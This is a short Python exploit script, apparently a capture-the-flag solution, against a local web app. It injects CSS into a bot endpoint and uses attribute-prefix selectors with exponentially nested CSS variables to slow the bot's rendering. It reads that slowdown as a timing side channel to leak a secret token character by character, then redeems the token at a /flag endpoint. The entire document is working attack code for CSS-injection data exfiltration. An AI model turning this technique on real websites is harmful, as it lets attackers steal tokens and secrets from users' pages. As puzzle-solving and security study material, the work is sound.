import requests
import time

url = "http://localhost:3000/"

def exploit():
    token = "00000"
    strings = "0123456789abcdefhigklmnopqrstuvwxyz"  # 优化顺序
    for _ in range(6):
        found = False
        for s in strings:
            css = f'''
            <style>
            h1[data-token^="{token+s}"]::after {{
              --a: "AAAAAAAAAA";
              --b: var(--a) var(--a) var(--a) var(--a) var(--a);
              --c: var(--b) var(--b) var(--b) var(--b) var(--b);
              --d: var(--c) var(--c) var(--c) var(--c) var(--c);
              --e: var(--d) var(--d) var(--d) var(--d) var(--d);
              --f: var(--e) var(--e) var(--e) var(--e) var(--e);
              --g: var(--f) var(--f) var(--f) var(--f) var(--f);
              --h: var(--g) var(--g) var(--g) var(--g) var(--g);
              content: var(--h);
              text-shadow: black 1px 1px 50px;
            }}
            </style>
            '''

            r0 = requests.get(url + "bot", params={"code": css})
            # 避免超时
            print(token+s)
            time.sleep(5)
            r = requests.get(url + "bot")
            print(r.text)
            if 'already open' in r.text:
                token += s
                print("Current token:", token)
                # 避免服务顶不住
                time.sleep(5)
                found = True
                break
        if not found:
            break
    
    return token

def get_flag(token):
    r = requests.get(url+"flag", params={"token":token})
    print("Flag:", r.text)

if __name__ == '__main__':
    t = exploit()
    get_flag(t)